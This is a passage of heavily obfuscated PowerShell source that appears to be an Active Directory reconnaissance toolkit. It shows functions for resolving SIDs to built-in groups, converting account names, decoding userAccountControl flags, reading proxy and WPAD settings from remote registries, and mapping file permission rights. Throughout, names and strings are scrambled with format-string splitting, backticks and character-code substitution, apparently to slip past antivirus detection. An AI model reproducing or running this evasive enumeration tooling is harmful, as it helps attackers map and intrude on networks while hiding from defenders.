                ("{2}{1}{0}"-f ("{0}{1}" -f '32-','561'),'-',("{0}{1}" -f'S-','1-5'))  { ((("{7}{4}{3}{0}{1}{5}{6}{2}" -f ("{1}{0}" -f'i','r L'),'c','s',("{1}{0}{2}"-f 'l ','na','Serve'),("{1}{0}" -f 'i','Term'),("{1}{0}{2}" -f' ','ense','Se'),("{1}{0}"-f 'r','rve'),("{0}{1}{2}"-f 'BUILTIN','U','Tn')))-rePLaCE  ([cHAr]85+[cHAr]84+[cHAr]110),[cHAr]92) }
                ("{0}{1}{3}{2}"-f 'S-','1-',("{1}{0}"-f'562','2-'),'5-3')  { ((("{7}{4}{1}{5}{2}{3}{6}{0}"-f("{0}{2}{1}"-f 'M','s',' User'),'str','u','te',("{1}{0}{2}" -f'H','IN','VfDi'),'ib',("{0}{1}" -f'd',' CO'),("{0}{1}" -f'B','UILT')))."Re`Pla`cE"(([Char]72+[Char]86+[Char]102),'\')) }
                ("{1}{3}{2}{0}" -f'569','S',("{2}{1}{0}"-f '32-','-','1-5'),'-')  { ((("{5}{2}{3}{4}{6}{0}{1}"-f("{1}{3}{2}{0}" -f'tor','phi','ra','c Ope'),'s',("{1}{0}"-f'IN','ILT'),'{0}Crypt','o','BU','gra'))  -F [cHAr]92) }
                ("{3}{0}{1}{2}" -f '-1',("{1}{0}" -f '-5','-5-32'),'73','S')  { ((("{2}{7}{5}{0}{8}{4}{6}{3}{1}" -f("{1}{3}{2}{0}" -f'og R','p','t L','dEven'),'rs','BU','e','a','N2','d',("{0}{1}"-f 'I','LTI'),'e'))."REpL`AcE"(([ChaR]50+[ChaR]112+[ChaR]100),[STrINg][ChaR]92)) }
                ("{2}{1}{0}{3}"-f '-5','-1','S',("{1}{0}" -f '32-574','-'))  { ((("{6}{5}{2}{4}{1}{0}{7}{3}" -f("{1}{0}" -f 'c',' Ac'),'M',("{1}{0}"-f 'e','icat'),'ss',("{0}{2}{1}" -f' Serv','CO','ice D'),'if',("{2}{1}{3}{0}{4}" -f'INBXUCer','U','B','ILT','t'),'e'))."R`epl`Ace"(([chAr]66+[chAr]88+[chAr]85),'\')) }
                ("{1}{0}{2}{3}" -f '-','S','1-5',("{2}{1}{0}"-f'5','2-57','-3'))  { ((("{2}{6}{1}{5}{3}{0}{7}{4}{8}" -f ("{0}{1}"-f'QRD','S '),'I','BUI','m',("{0}{1}" -f 'er','ver'),'N4','LT',("{0}{3}{1}{2}" -f'Remote','s','s S',' Acce'),'s')).("{1}{0}{2}"-f 'p','rE',("{1}{0}" -f'e','lAC'))."I`NVOke"('4mQ','\')) }
                ("{1}{2}{0}" -f'576','S-',("{2}{1}{0}" -f '-32-','5','1-'))  { ((("{5}{2}{7}{3}{1}{0}{6}{4}"-f("{1}{0}"-f 'rve',' Se'),'t',("{0}{1}" -f 'T','INor'),("{1}{2}{0}" -f'oin','S',' Endp'),'s',("{0}{1}"-f'BU','IL'),'r','SRD')) -crePlAcE  'orS',[chAR]92) }
                ("{1}{0}{3}{2}"-f("{1}{0}" -f '2','-1-5-3'),'S','77','-5')  { ((("{5}{1}{0}{2}{6}{3}{4}{7}{8}" -f'D',("{1}{2}{0}"-f'HvMR','UI','LTIN'),'S M','ent',' Se','B',("{0}{1}" -f 'anag','em'),'rv','ers')).("{0}{1}{2}"-f ("{1}{0}" -f'epL','R'),'a','ce')."IN`VokE"('HvM','\')) }
                ("{2}{1}{0}"-f '78',("{1}{0}" -f'5','-5-32-'),'S-1')  { ((("{2}{5}{4}{0}{6}{1}{3}" -f '{0}Hype',("{2}{0}{1}{3}"-f'nistr','a','dmi','t'),'BUI','ors','N','LTI',("{0}{1}"-f'r-V',' A')))  -F[cHar]92) }
                ("{0}{2}{1}{3}" -f("{0}{1}" -f'S-1','-'),("{1}{0}"-f '-57','32'),'5-','9')  { ((("{9}{5}{6}{8}{4}{7}{2}{3}{1}{10}{0}"-f("{0}{1}" -f 'at','ors'),("{0}{1}" -f 'a','nce O'),'sis','t','0}Access','UIL','TIN',("{2}{1}{0}" -f 'ol As','ontr',' C'),'{','B','per'))-F  [char]92) }
                ("{3}{0}{2}{1}"-f ("{0}{1}"-f '-','32-'),'0','58',("{1}{0}"-f '5','S-1-'))  { ((("{5}{11}{4}{13}{10}{2}{8}{1}{9}{6}{3}{14}{7}{0}{12}"-f 'tor','C','ess',("{2}{1}{0}"-f 'e',' Op','nce'),'q','BU',("{0}{1}"-f 'ssist','a'),'a',' ',("{1}{0}{2}"-f'n','o','trol A'),'cc',("{0}{2}{1}" -f'ILTI','X','N'),'s','MA','r'))  -RePLAcE 'XqM',[CHAr]92) }
                ("{0}{1}"-f'Def',("{0}{1}"-f 'a','ult')) { 
                    ${O`Bj} = (&("{2}{0}{1}" -f ("{1}{0}" -f 'Obj','w-'),'ect','Ne') ("{0}{4}{5}{3}{6}{10}{8}{7}{1}{2}{9}"-f'S','den',("{1}{0}"-f 'fi','ti'),("{1}{0}" -f'i','ty.Pr'),("{0}{1}"-f'ystem.S','e'),("{1}{0}" -f'ri','cu'),("{0}{1}"-f'n','cipa'),("{0}{1}"-f'it','yI'),'cur','er',("{0}{1}"-f'l.S','e'))(${s`ID2}))
                    ${O`BJ}."T`Rans`lAtE"( [System.Security.Principal.NTAccount])."V`ALUe"
                }
            }
        }
        catch {
            
            ${S`id}
        }
    }
}


function COnV`ert-n`T4TO`cA`N`oNI`Cal {

    [CmdletBinding()]
    param(
        [Parameter(maNdATOrY=${T`Rue},VALUefRomPipelinE=${tr`Ue})]
        [String]
        ${oBj`ec`Tn`Ame}
    )

    process {

        ${oBJe`c`Tn`Ame} = ${ob`jeC`Tn`AmE} -replace "/","\"
        
        if(${OBJEc`TN`Ame}.("{1}{0}" -f("{1}{0}"-f's','ain'),("{1}{0}"-f'nt','co'))."i`NVokE"("\")) {
            
            ${D`OmaIn} = ${ObJ`ECtNA`Me}.("{1}{0}" -f 'it','spl')."iNV`o`KE"("\")[0]
        }

        
        function i`N`VOkE-M`eth`od([__ComObject] ${o`Bj`ECT}, [String] ${mET`HOd}, ${PAR`AMe`TE`Rs}) {
            ${out`P`Ut} = ${obJ`Ect}.("{0}{1}"-f ("{1}{0}" -f'etT','G'),'ype')."i`Nv`OKE"().("{3}{0}{1}{2}"-f'e','Me',("{1}{0}" -f 'er','mb'),("{1}{0}"-f'ok','Inv'))."inv`oKe"(${Met`HOD}, ("{0}{2}{1}"-f ("{0}{1}" -f'Invok','eMet'),'d','ho'), ${N`UlL}, ${oBJe`ct}, ${pARa`MetE`RS})
            if ( ${o`UT`PUt} ) { ${O`UTpUt} }
        }
        function S`et`-`PRoPeRtY([__ComObject] ${O`Bj`ect}, [String] ${p`RoPer`Ty}, ${Pa`R`AMete`RS}) {
            [Void] ${oB`jEcT}.("{1}{0}" -f("{1}{2}{0}"-f 'ype','e','tT'),'G')."iNv`Oke"().("{0}{1}{2}{3}"-f ("{0}{1}"-f'In','vo'),'keM','emb','er')."INv`oKe"(${PRo`p`ERtY}, ("{0}{1}{2}"-f 'Set',("{1}{0}"-f 'rop','P'),("{0}{1}" -f'er','ty')), ${NU`ll}, ${OBjE`ct}, ${pa`R`Am`etERs})
        }

        ${trA`Ns`LATE} = &("{2}{1}{0}"-f ("{1}{0}" -f 't','jec'),'b',("{1}{0}" -f'ew-O','N')) -ComObject ("{2}{4}{3}{1}{0}" -f'e','at','Nam',("{2}{0}{1}" -f 'ran','sl','T'),'e')

        try {
            &("{2}{1}{3}{0}" -f 'hod','e-M',("{1}{0}"-f 'vok','In'),'et') ${T`R`A`NSlATE} ("{1}{0}" -f'nit','I') (1, ${D`OMAin})
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            &("{0}{2}{1}"-f 'Wri','bug',("{1}{0}"-f'e','te-D')) ('Err'+'or '+'wi'+'th '+("{0}{1}" -f 'tra','ns')+'l'+("{1}{0}" -f' ','ate')+'ini'+'t '+'in'+' '+("{1}{0}{2}" -f'ert','Conv','-')+'NT'+'4'+'t'+("{1}{0}{2}"-f 'ano','oC','n')+("{0}{1}"-f 'ica','l:')+' '+"$_")
        }

        &("{1}{0}{2}"-f("{1}{0}"-f 'Pr','et-'),'S',("{1}{0}" -f 'erty','op')) ${TRA`N`sLa`Te} ("{1}{2}{0}{3}"-f'f','Cha',("{1}{0}"-f 'e','seR'),("{1}{0}"-f'l','erra')) (0x60)

        try {
            &("{0}{1}{2}{3}" -f 'I',("{1}{0}" -f 'ke','nvo'),'-Me',("{0}{1}"-f't','hod')) ${Tr`An`slAte} "Set" (3, ${ObJ`eC`TnAME})
            (&("{1}{0}{2}"-f("{0}{3}{1}{2}" -f 'vok','Meth','o','e-'),'In','d') ${t`RaN`SLATE} "Get" (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            &("{0}{2}{1}"-f ("{1}{0}"-f'e-','Writ'),("{0}{1}" -f'e','bug'),'D') ('E'+("{0}{1}" -f'rro','r')+' '+("{1}{0}"-f 'th','wi')+' '+'t'+("{0}{1}" -f 'ra','nslat')+'e '+'Set'+("{1}{0}"-f 't','/Ge')+' '+'in'+' '+'Co'+("{1}{0}" -f 'rt','nve')+("{1}{0}"-f'4to','-NT')+("{1}{0}" -f'ca','Canoni')+'l: '+"$_")
        }
    }
}


function Con`VeRT-`Ca`N`OniCAlt`ont4 {


    [CmdletBinding()]
    param(
        [String] ${objE`cTN`A`Me}
    )

    ${Do`M`AiN} = (${Ob`JEC`TnaME} -split "@")[1]

    ${obJECT`N`AME} = ${oB`JEC`Tname} -replace "/","\"

    
    function INvOK`e`-`M`e`THoD([__ComObject] ${OBj`eCt}, [String] ${ME`ThOD}, ${P`A`Rame`TeRs}) {
        ${O`UTPuT} = ${ob`j`eCt}.("{1}{2}{0}"-f'e',("{1}{0}" -f 'Ty','Get'),'p')."iN`VO`KE"().("{0}{1}{2}"-f 'Inv',("{0}{1}" -f 'okeMe','mb'),'er')."iNv`o`ke"(${m`eThoD}, ("{2}{1}{0}" -f ("{0}{1}"-f 'e','Method'),'k',("{1}{0}" -f 'nvo','I')), ${n`Ull}, ${Ob`Je`cT}, ${p`A`RaM`EtErS})
        if ( ${Outp`Ut} ) { ${OuT`pUT} }
    }
    function seT`-`P`ROPerty([__ComObject] ${Ob`jE`Ct}, [String] ${P`R`OpERtY}, ${ParA`Met`ErS}) {
        [Void] ${obJ`e`CT}.("{0}{2}{1}" -f'Get','pe','Ty')."I`N`VOkE"().("{2}{0}{1}{3}" -f("{2}{1}{0}" -f 'Memb','e','vok'),'e','In','r')."InvO`KE"(${pR`Ope`Rty}, ("{1}{2}{0}"-f("{0}{1}" -f 'pe','rty'),("{0}{1}"-f'S','etPr'),'o'), ${n`Ull}, ${oB`j`ECT}, ${Pa`R`Am`eTerS})
    }

    ${t`R`ANsL`ATE} = &("{2}{0}{3}{1}" -f 'O','ect',("{0}{1}"-f 'N','ew-'),'bj') -comobject ("{1}{3}{0}{2}" -f 'l',("{0}{1}"-f'Na','meTr'),'ate','ans')

    try {
        &("{1}{0}{2}{4}{3}" -f 'v','In','oke','od',("{1}{0}" -f 'h','-Met')) ${TR`AnSLA`TE} ("{0}{1}"-f 'Ini','t') (1, ${Do`mA`In})
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    &("{1}{2}{3}{0}" -f'rty','Se','t-P',("{1}{0}"-f'pe','ro')) ${T`RaNslA`Te} ("{2}{1}{0}{3}" -f("{0}{1}" -f'Ref','er'),("{0}{1}"-f'has','e'),'C','ral') (0x60)

    try {
        &("{2}{1}{0}"-f ("{1}{0}" -f '-Method','e'),'vok','In') ${Tr`A`NSlATe} "Set" (5, ${obJ`ec`TnA`me})
        (&("{1}{2}{0}"-f ("{1}{0}"-f 'd','tho'),("{0}{1}" -f'Inv','oke-'),'Me') ${tR`A`NsLATE} "Get" (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { ${_} }
}


function co`NVERTFrOm-U`ACV`AL`UE {

    
    [CmdletBinding()]
    param(
        [Parameter(valuEfrOMPipEliNe=${T`Rue})]
        ${V`A`lue},

        [Switch]
        ${s`h`owalL}
    )

    begin {

        
        ${u`AcvA`lUeS} = &("{2}{1}{0}"-f't','jec',("{0}{1}" -f 'Ne','w-Ob')) ("{3}{10}{2}{8}{6}{0}{7}{5}{1}{9}{12}{4}{11}"-f't',("{1}{3}{2}{0}"-f 'd','.Specia','ze','li'),'.',("{1}{0}"-f 'st','Sy'),'na','ns',("{1}{0}" -f 'ec','oll'),'io','C',("{1}{0}"-f'Orde','.'),'em','ry',("{0}{3}{1}{2}"-f'redDi','i','o','ct'))
        ${uaCV`AL`UEs}.("{0}{1}" -f'A','dd')."I`NVOkE"(("{1}{0}{2}" -f'RI','SC','PT'), 1)
        ${u`Acv`ALUEs}.("{0}{1}" -f 'A','dd')."i`NVo`Ke"(("{0}{2}{3}{1}{4}"-f("{0}{1}{2}" -f'ACC','OUN','T'),'BL','DI','SA','E'), 2)
        ${uA`CvaLU`ES}.("{0}{1}" -f 'Ad','d')."iN`V`OKE"(("{1}{0}{3}{2}" -f("{0}{1}"-f 'E','DIR_'),'HOM','D',("{0}{1}{2}" -f 'REQU','IR','E')), 8)
        ${U`ACV`AlUEs}.("{0}{1}"-f 'Ad','d')."inV`Oke"(("{0}{1}"-f'L',("{1}{0}" -f'T','OCKOU')), 16)
        ${U`Ac`VALuEs}.("{1}{0}"-f 'd','Ad')."iNvO`Ke"(("{3}{0}{2}{1}"-f("{0}{2}{1}" -f 'S','T','SWD_NO'),'QD','RE','PA'), 32)
        ${u`AcVaL`UES}.("{1}{0}" -f 'dd','A')."in`V`oKe"(("{1}{3}{4}{0}{2}{5}" -f'D_C','PA','AN','SS','W',("{1}{0}"-f 'ANGE','T_CH')), 64)
        ${Ua`cv`ALueS}.("{1}{0}"-f'd','Ad')."In`VOKe"(("{4}{1}{3}{2}{5}{0}"-f("{1}{0}" -f 'LOWED','L'),("{1}{0}"-f'_','PTED'),("{1}{0}"-f '_','_PWD'),("{0}{1}"-f'T','EXT'),("{1}{0}" -f 'Y','ENCR'),'A'), 128)
        ${UaCvA`lU`ES}.("{0}{1}" -f 'Ad','d')."I`NvOkE"(("{1}{2}{0}{5}{6}{4}{3}" -f'I','T',("{0}{1}{2}" -f 'EM','P_','DUPL'),("{0}{1}"-f '_AC','COUNT'),'TE','C','A'), 256)
        ${UACV`ALu`Es}.("{1}{0}" -f'dd','A')."iN`VOKE"(("{3}{2}{0}{1}"-f ("{0}{1}" -f'MA','L_A'),("{0}{1}{2}" -f'C','COUN','T'),'OR','N'), 512)
        ${UACvA`L`Ues}.("{0}{1}"-f'A','dd')."InvO`Ke"(("{1}{6}{0}{3}{4}{2}{5}"-f '_T',("{0}{1}"-f 'INT','E'),'OUN',("{1}{0}" -f 'ST_','RU'),'ACC','T',("{0}{1}{2}"-f'R','DOMAI','N')), 2048)
        ${U`ACVa`lUeS}.("{0}{1}" -f'A','dd')."I`N`Voke"(("{2}{0}{1}{3}{4}" -f ("{2}{1}{0}"-f 'ON_TR','I','AT'),("{1}{0}" -f 'T_','US'),("{2}{1}{0}" -f'T','S','WORK'),'A',("{0}{1}"-f'CCO','UNT')), 4096)
        ${uAC`Va`LuEs}.("{0}{1}"-f 'A','dd')."INV`Oke"(("{2}{5}{4}{3}{0}{1}"-f 'O','UNT',("{0}{1}" -f'S','ERV'),'CC',("{1}{0}"-f'UST_A','R'),("{1}{0}" -f'R_T','E')), 8192)
        ${u`AC`VAluEs}.("{1}{0}" -f'd','Ad')."I`NVoKE"(("{5}{3}{1}{0}{2}{6}{4}" -f 'E_',("{1}{0}"-f 'R','XPI'),'P',("{0}{1}"-f 'NT_','E'),'ORD','DO',("{0}{1}"-f 'AS','SW')), 65536)
        ${uAC`VA`LUeS}.("{1}{0}" -f'dd','A')."In`VOkE"(("{1}{4}{2}{3}{0}" -f 'NT','M',("{2}{1}{0}" -f 'ON_ACC','_LOG','S'),'OU','N'), 131072)
        ${uAc`VaLU`Es}.("{0}{1}"-f 'A','dd')."INVO`Ke"(("{1}{4}{0}{2}{3}"-f ("{1}{0}{2}"-f 'RE','ARD_','QUIR'),'SM','E','D',("{0}{1}"-f'A','RTC')), 262144)
        ${UA`cvALu`es}.("{1}{0}" -f'dd','A')."in`VOKE"(("{1}{4}{3}{0}{2}"-f 'GAT',("{0}{1}"-f 'TR','US'),'ION',("{2}{0}{1}" -f'_FOR_D','ELE','ED'),'T'), 524288)
        ${U`ACVAL`UES}.("{1}{0}" -f 'dd','A')."INvo`ke"(("{1}{3}{2}{0}{4}" -f'TE',("{0}{1}"-f'NOT','_'),'A',("{0}{1}" -f 'DE','LEG'),'D'), 1048576)
        ${U`AcV`AlueS}.("{0}{1}"-f'Ad','d')."InV`O`kE"(("{0}{2}{3}{1}"-f ("{0}{1}" -f'U','SE_DE'),("{1}{0}"-f'LY','ON'),("{1}{0}"-f'E','S_K'),'Y_'), 2097152)
        ${Uac`ValU`eS}.("{1}{0}"-f 'dd','A')."I`NvOKe"(("{4}{0}{3}{2}{1}" -f'Q_','TH','EAU','PR',("{0}{1}" -f'D','ONT_RE')), 4194304)
        ${ua`CV`ALuES}.("{1}{0}"-f'dd','A')."INVO`Ke"(("{2}{3}{1}{4}{0}"-f'ED','R','PA',("{0}{1}" -f 'SS','WO'),("{0}{2}{1}" -f'D','PIR','_EX')), 8388608)
        ${u`Acva`luES}.("{1}{0}"-f'dd','A')."I`NV`Oke"(("{8}{6}{7}{2}{1}{3}{4}{5}{0}" -f("{1}{0}"-f 'N','ATIO'),("{1}{0}"-f'H_','AUT'),'_','F',("{0}{1}"-f'OR','_D'),("{0}{1}"-f'EL','EG'),'ST',("{1}{0}"-f '_TO','ED'),'TRU'), 16777216)
        ${u`ACvAL`UEs}.("{0}{1}" -f 'Ad','d')."iNv`o`Ke"(("{4}{1}{5}{0}{3}{6}{2}" -f'TS',("{1}{0}" -f'IA','ART'),'T',("{0}{1}" -f'_ACCO','U'),'P',("{2}{0}{1}"-f'_SE','CRE','L'),'N'), 67108864)

    }

    process {

        ${R`eSultua`cVAL`UEs} = &("{0}{2}{3}{1}" -f 'Ne','ct',("{0}{1}"-f 'w-O','b'),'je') ("{8}{1}{4}{9}{7}{12}{6}{2}{13}{3}{10}{14}{0}{5}{11}"-f 't','t','Sp',("{0}{1}"-f 'O','rder'),("{2}{0}{1}"-f 'l','e','em.Col'),'io','.','tio','Sys','c','ed',("{1}{0}" -f'ry','na'),'ns',("{3}{0}{2}{1}" -f 'a','ized.','l','eci'),'Dic')

        if(${v`ALUe} -is [Int]) {
            ${Int`Value} = ${VA`luE}
        }

        if (${va`l`Ue} -is [PSCustomObject]) {
            if(${VAl`UE}."USeRa`CCOU`NTc`O`NTROl") {
                ${In`TvALUe} = ${Va`LUE}."Us`E`RAC`c`OUNtCO`NtROl"
            }
        }

        if(${iNtv`AL`UE}) {

            if(${shO`Wall}) {
                foreach (${U`A`CvaLUE} in ${u`AcValU`es}.("{2}{0}{3}{1}" -f ("{0}{1}" -f'Enu','m'),("{0}{1}"-f 'ra','tor'),'Get','e')."INv`OKe"()) {
                    if( (${iN`TvAL`UE} -band ${UACv`A`lue}."VA`lue") -eq ${U`Ac`ValUe}."VA`lUe") {
                        ${ResultUA`c`Va`LuES}.("{0}{1}" -f'Ad','d')."I`NVo`ke"(${Ua`cV`ALUe}."n`AmE", "$($UACValue.Value)+")
                    }
                    else {
                        ${RESulTu`A`Cva`Lues}.("{1}{0}" -f'dd','A')."Invo`KE"(${U`Ac`ValuE}."nA`mE", "$($UACValue.Value)")
                    }
                }
            }
            else {
                foreach (${Ua`cvA`lUE} in ${U`AcvA`l`UeS}.("{2}{3}{0}{1}"-f 'a','tor',("{1}{0}"-f'n','GetE'),("{1}{0}" -f 'mer','u'))."invo`kE"()) {
                    if( (${I`NTVA`L`UE} -band ${U`ACvA`LUE}."Va`Lue") -eq ${uA`CV`ALUe}."V`AlUe") {
                        ${rEsult`UAc`Va`LueS}.("{0}{1}" -f'A','dd')."in`VOke"(${U`AC`VaLue}."nA`ME", "$($UACValue.Value)")
                    }
                }                
            }
        }

        ${R`esu`LtUA`CvALueS}
    }
}


function gET`-`PRoxY {

    param(
        [Parameter(VALuEFrOmpiPeLIne=${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${COM`pUte`Rn`Ame} = ${EN`V:COmPU`T`e`RnaME}
    )

    process {
        try {
            ${R`eg} =   (&("{2}{1}{0}"-f'lE','IAb','vAr') ('9'+'2m')  -vaLUe )::("{2}{4}{0}{5}{3}{1}"-f'e',("{3}{1}{0}{2}"-f 'a','teB','seKey','o'),'O','m','p','nRe')."in`VoKe"(("{1}{3}{0}{2}"-f ("{1}{0}"-f 'Us','nt'),("{1}{0}" -f 'urr','C'),'er','e'), ${c`oMPUtER`Na`ME})
            ${r`Eg`Key} = ${R`EG}.("{0}{2}{1}"-f'Ope','key',("{0}{1}"-f 'nS','ub'))."i`NV`OKE"(((("{2}{6}{11}{13}{14}{15}{12}{16}{5}{1}{9}{17}{4}{7}{10}{0}{3}{8}" -f ("{0}{1}"-f 'e','tti'),("{0}{1}"-f'aF','sC'),'SOF','ng',("{1}{0}{2}{3}" -f'io','rs','naFsaF','s'),("{0}{1}" -f'ws','aFs'),'T',("{2}{0}{1}" -f'er','net ','Int'),'s','ur','S','WAR',("{2}{0}{1}"-f 't','aFsaFsWi','of'),("{2}{0}{1}"-f 'sa','FsMic','EaF'),'r','os','ndo',("{0}{1}" -f 'ren','tVe'))) -rePlAcE ([cHar]97+[cHar]70+[cHar]115),[cHar]92))
            ${p`Ro`XYS`ervEr} = ${re`Gk`ey}.("{2}{1}{0}"-f'ue','l',("{1}{0}" -f'a','GetV'))."I`NVo`Ke"(("{3}{0}{2}{1}" -f'rox','ver',("{1}{0}"-f 'r','ySe'),'P'))
            ${auTO`COnF`igu`Rl} = ${rE`gkey}.("{1}{0}" -f 'lue',("{0}{1}" -f'GetV','a'))."i`NvO`kE"(("{1}{2}{3}{0}" -f("{1}{0}" -f 'RL','gU'),'Au',("{1}{0}" -f 'f','toCon'),'i'))

            if(${aUtOCOnf`Ig`URl} -and (${A`Ut`OCO`NfiGu`RL} -ne "")) {
                try {
                    ${Wp`AD} = (&("{0}{1}{2}"-f("{0}{1}" -f'Ne','w-'),("{0}{1}"-f 'Obje','c'),'t') ("{0}{1}{2}{3}" -f'N','e',("{1}{0}" -f'.Webcli','t'),'ent')).("{3}{2}{1}{0}"-f ("{0}{1}" -f 'r','ing'),("{0}{1}"-f'load','St'),'wn','Do')."INVO`Ke"(${a`UtOC`oNFI`gUrl})
                }
                catch {
                    ${WP`Ad} = ""
                }
            }
            else {
                ${w`pAd} = ""
            }
            
            if(${p`ROxys`ERVeR} -or ${Aut`O`confiGU`Rl}) {

                ${p`RO`pErT`iES} = @{
                    ("{1}{2}{0}" -f 'ver',("{0}{1}" -f'Pro','xySe'),'r') = ${pRoXYse`R`VER}
                    ("{2}{0}{3}{1}" -f 't',("{0}{1}" -f 'nfi','gURL'),'Au','oCo') = ${AUTOco`N`FI`gU`RL}
                    ("{0}{1}"-f 'Wp','ad') = ${w`PAd}
                }
                
                &("{1}{0}{3}{2}"-f'e','N','t',("{1}{0}" -f 'ec','w-Obj')) -TypeName ("{1}{2}{0}" -f 't',("{1}{0}" -f'SOb','P'),'jec') -Property ${pROp`ERT`i`es}
            }
            else {
                &("{1}{3}{0}{2}" -f'W','W',("{1}{0}{2}" -f'nin','ar','g'),("{1}{0}"-f'ite-','r')) ('N'+'o '+("{1}{0}"-f 'xy','pro')+' '+("{0}{1}"-f 's','ettin')+'gs'+' '+'fou'+'n'+'d '+'f'+'or '+"$ComputerName")
            }
        }
        catch {
            &("{2}{0}{3}{1}"-f't',("{1}{2}{0}" -f 'ng','W','arni'),'Wri','e-') (("{0}{1}" -f 'E','rror')+' '+'enu'+'mer'+'at'+("{0}{1}"-f'i','ng ')+'pro'+'x'+'y '+'set'+("{1}{0}"-f 'g','tin')+'s'+' '+'f'+'or '+"$ComputerName")
        }
    }
}


function g`E`T-pAt`Hacl {

    [CmdletBinding()]
    param(
        [Parameter(MANDaToRY=${t`RUE}, vaLuefromPIpEline=${t`RUe})]
        [string]
        ${pA`Th},

        [Switch]
        ${R`E`cuRsE}
    )

    begin {

        function C`o`NV`e`Rt-`FilErI`ght {

            

            [CmdletBinding()]
            param(
                [Int]
                ${F`sr}
            )

            ${ACceS`Sm`A`SK} = @{
              [uint32]("{0}{1}{2}"-f ("{2}{0}{1}"-f'x8000','0','0'),'0','00') = ("{1}{2}{0}"-f'ad','Ge',("{1}{0}"-f'ricRe','ne'))
              [uint32]("{0}{2}{1}" -f("{1}{0}"-f '40','0x'),'000','000') = ("{2}{1}{0}"-f 'e','rit',("{2}{1}{0}"-f 'icW','ener','G'))
              [uint32]("{0}{1}{2}" -f'0x',("{1}{0}" -f '0','20000'),'00') = ("{2}{4}{0}{1}{3}"-f 'er',("{1}{0}" -f 'xe','icE'),'Ge',("{0}{1}" -f 'cu','te'),'n')
              [uint32]("{2}{0}{1}"-f("{1}{0}"-f '00','1000'),'00','0x') = ("{2}{0}{1}" -f'ner',("{1}{0}" -f'All','ic'),'Ge')
              [uint32]("{2}{1}{3}{0}" -f("{0}{1}"-f '0000','0'),'x0','0','20') = ("{2}{3}{0}{1}"-f("{0}{1}"-f 'All','ow'),'ed',("{1}{0}" -f 'xim','Ma'),'um')
              [uint32]("{1}{2}{0}{3}" -f("{1}{0}" -f'000','00'),'0x0','1','0') = ("{1}{0}{3}{4}{2}" -f ("{0}{1}" -f'ess','S'),'Acc',("{1}{0}"-f 'ity','ur'),'ys',("{1}{0}"-f 'c','temSe'))
              [uint32]("{0}{1}{2}" -f("{0}{1}{2}"-f'0x','0010','0'),'00','0') = ("{2}{0}{1}" -f ("{0}{1}" -f'chr','oni'),'ze','Syn')
              [uint32]("{3}{1}{2}{0}" -f '00','00','800','0x0') = ("{3}{1}{0}{2}" -f'eO','t',("{0}{1}" -f 'wn','er'),'Wri')
              [uint32]("{0}{2}{1}"-f("{0}{1}"-f'0x','00'),("{0}{1}" -f'00','00'),'04') = ("{1}{2}{0}" -f 'C','W',("{1}{0}" -f 'eDA','rit'))
              [uint32]("{1}{2}{0}"-f '00',("{1}{0}"-f'00','0x0'),'200') = ("{3}{1}{0}{2}" -f ("{1}{0}" -f'Con','ad'),'e',("{0}{1}" -f'tro','l'),'R')
              [uint32]("{0}{3}{2}{1}" -f ("{1}{0}{2}" -f'0','0x0','010'),'0','0','0') = ("{1}{0}"-f 'ete','Del')
              [uint32]("{2}{1}{0}"-f'0','010',("{0}{1}" -f'0','x0000')) = ("{1}{3}{2}{0}"-f("{1}{2}{0}"-f 's','ri','bute'),'W',("{1}{0}"-f 't','iteAt'),'r')
              [uint32]("{1}{3}{0}{2}"-f'8','0','0',("{2}{1}{0}"-f'000','00','x0')) = ("{2}{0}{1}"-f'r',("{1}{0}" -f'tes','ibu'),("{0}{1}{2}"-f 'R','ea','dAtt'))
              [uint32]("{2}{0}{1}" -f("{0}{1}"-f'x0','000004'),'0','0') = ("{2}{3}{1}{0}"-f'ild',("{0}{1}" -f 'le','teCh'),'D','e')
              [uint32]("{2}{0}{1}" -f '00',("{0}{1}" -f '00','20'),("{0}{1}"-f'0x','00')) = ("{1}{2}{0}{3}"-f 'er',("{1}{0}"-f'ecute','Ex'),("{0}{1}" -f '/Tra','v'),'se')
              [uint32]("{0}{1}{2}{3}"-f '0',("{0}{2}{1}" -f 'x0000','0','0'),'1','0') = ("{5}{2}{1}{4}{3}{0}{6}" -f'ute',("{1}{0}" -f 'xt','eE'),'rit',("{1}{0}{2}"-f't','edAt','rib'),'end','W','s')
              [uint32]("{1}{3}{0}{2}"-f'00',("{1}{0}" -f'0','0x00'),'08','0') = ("{3}{2}{0}{4}{5}{1}"-f'e',("{1}{0}"-f's','bute'),("{1}{0}{2}" -f 'dExt','ea','end'),'R','d',("{1}{0}"-f 'ttri','A'))
              [uint32]("{1}{2}{0}"-f("{0}{2}{1}" -f '00','4','0000'),'0x','0') = ("{0}{2}{1}{3}{4}"-f ("{1}{0}" -f'e','App'),("{2}{1}{0}" -f'ddSubd','ata/A','dD'),'n',("{0}{1}{2}"-f'irect','o','r'),'y')
              [uint32]("{0}{1}{2}{3}"-f'0','x0',("{0}{1}" -f'000','00'),'02') = ("{0}{1}{2}{4}{3}" -f'Wr',("{2}{1}{0}"-f 'at','eD','it'),'a',("{0}{1}"-f 'dF','ile'),'/Ad')
              [uint32]("{0}{1}{2}"-f'0x0',("{0}{1}"-f'0','0000'),'01') = ("{4}{2}{1}{3}{0}" -f'ry',("{1}{0}" -f'ect','tDir'),'s','o',("{0}{1}{2}" -f'ReadDat','a/','Li'))
            }

            ${Si`m`PlePErMI`s`s`IoNs} = @{
              [uint32]("{2}{0}{1}" -f("{0}{1}"-f 'x1f','0'),'1ff','0') = ("{3}{2}{1}{0}"-f 'ol',("{1}{0}" -f'ntr','Co'),'ll','Fu')
              [uint32]("{0}{1}"-f '0x',("{1}{0}"-f'1bf','030')) = ("{0}{2}{1}"-f ("{1}{0}" -f 'odi','M'),'y','f')
              [uint32]("{0}{1}{2}"-f("{0}{1}" -f'0x0','2'),'00a','9') = ("{1}{0}{2}"-f 'd',("{0}{1}"-f'ReadA','n'),("{1}{0}"-f'cute','Exe'))
              [uint32]("{1}{0}{2}"-f("{0}{1}{2}" -f'x0','201','9'),'0','f') = ("{0}{1}{3}{2}"-f 'R','e',("{0}{1}" -f'ndWrit','e'),'adA')
              [uint32]("{1}{0}{2}"-f '00',("{0}{1}"-f'0x0','2'),'89') = ("{0}{1}"-f 'R','ead')
